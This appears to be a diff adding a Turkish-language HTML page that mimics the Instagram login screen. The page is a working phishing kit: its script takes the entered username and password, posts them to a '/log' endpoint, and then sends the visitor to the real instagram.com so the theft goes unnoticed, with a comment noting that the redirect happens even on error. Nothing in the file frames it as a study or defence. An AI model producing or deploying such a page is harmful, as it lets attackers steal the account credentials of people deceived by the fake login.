@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Instagram  Giriş Yap</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 32px;
+            max-width: 350px;
+            width: 100%;
+        }
+        
+        .login-box {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
+            margin-bottom: 10px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+ .logo {
+    font-family: 'Great Vibes', cursive;
+    font-size: 50px;
+    font-weight: 400; /* Çok etkili olmayabilir ama yine de ekle */
+    color: #444;
+}
+
+
+        form {
+            width: 100%;
+        }
+        
+        .form-group {
+            margin-bottom: 6px;
+            width: 100%;
+        }
+        
+        input {
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            color: #262626;
+            font-size: 14px;
+            padding: 9px 8px;
+            width: 100%;
+            outline: none;
+        }
+        
+        input:focus {
+            border-color: #a8a8a8;
+        }
+        
+        button {
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            padding: 8px 0;
+            width: 100%;
+            margin-top: 8px;
+            cursor: pointer;
+        }
+        
+        button:disabled {
+            background-color: rgba(0, 149, 246, 0.3);
+            cursor: default;
+        }
+        
+        .separator {
+            display: flex;
+            align-items: center;
+            color: #8e8e8e;
+            margin: 18px 0;
+            width: 100%;
+        }
+        
+        .separator::before,
+        .separator::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+        
+        .separator span {
+            margin: 0 18px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            margin: 8px 0;
+            cursor: pointer;
+        }
+        
+        .facebook-icon {
+            color: #385185;
+            font-weight: bold;
+            margin-right: 8px;
+        }
+        
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-align: center;
+            margin: 12px 0;
+            cursor: pointer;
+        }
+        
+        .signup-box {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .signup-box p {
+            font-size: 14px;
+        }
+        
+        .signup-link {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .app-download {
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .app-download p {
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        
+        .app-links {
+            display: flex;
+            justify-content: center;
+        }
+        
+        .app-button {
+            background-color: black;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 8px 12px;
+            margin: 0 5px;
+            font-size: 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+        
+        .footer {
+            margin: 24px 0;
+            text-align: center;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 12px;
+        }
+        
+        .footer-link {
+            color: #8e8e8e;
+            font-size: 12px;
+            margin: 0 8px 12px 8px;
+            text-decoration: none;
+        }
+        
+        .copyright {
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+        
+        @media (max-width: 450px) {
+            .container {
+                margin-top: 0;
+            }
+            
+            .login-box {
+                border: none;
+                background: transparent;
+            }
+            
+            body {
+                background-color: white;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <h1 class="logo">Instagram
+                <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&display=swap" rel="stylesheet">
+
+
+            </h1>
+            <form id="loginForm">
+                <div class="form-group">
+                    <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" aria-label="Telefon numarası, kullanıcı adı veya e-posta" />
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" placeholder="Şifre" aria-label="Şifre" />
+                </div>
+                <button type="submit" disabled>Giriş Yap</button>
+            </form>
+            
+            <div class="separator">
+                <span>YA DA</span>
+            </div>
+            
+            <div class="facebook-login">
+                <span class="facebook-icon">f</span>
+                Facebook ile Giriş Yap
+            </div>
+            
+            <div class="forgot-password">
+                Şifreni mi unuttun?
+            </div>
+        </div>
+        
+        <div class="signup-box">
+            <p>Hesabın yok mu? <a href="#" class="signup-link">Kaydol</a></p>
+        </div>
+        
+        <div class="app-download">
+            <p>Uygulamayı indir.</p>
+            <div class="app-links">
+                <button class="app-button">App Store'dan İndir</button>
+                <button class="app-button">Google Play'den İndir</button>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#" class="footer-link">Hakkında</a>
+            <a href="#" class="footer-link">Blog</a>
+            <a href="#" class="footer-link">İş Fırsatları</a>
+            <a href="#" class="footer-link">Yardım</a>
+            <a href="#" class="footer-link">API</a>
+            <a href="#" class="footer-link">Gizlilik</a>
+            <a href="#" class="footer-link">Koşullar</a>
+            <a href="#" class="footer-link">Konumlar</a>
+            <a href="#" class="footer-link">Dil</a>
+            <a href="#" class="footer-link">Meta Verified</a>
+        </div>
+        <div class="copyright">© 2025 Instgram</div>
+    </footer>
+
+    <script>
+        const inputs = document.querySelectorAll('input');
+        const button = document.querySelector('button');
+        const form = document.getElementById('loginForm');
+
+        inputs.forEach(input => {
+            input.addEventListener('input', () => {
+                const username = document.getElementById('username').value.trim();
+                const password = document.getElementById('password').value.trim();
+                button.disabled = !(username && password.length >= 6);
+            });
+        });
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            fetch('/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password })
+            }).then(() => {
+                // İstersen gerçek siteye yönlendirebilirsin
+                window.location.href = 'https://instagram.com';
+            }).catch(() => {
+                // Hata olsa bile yönlendirebilirsin
+                window.location.href = 'https://instagram.com';
+            });
+        });
+    </script>
+</body>
+</html>
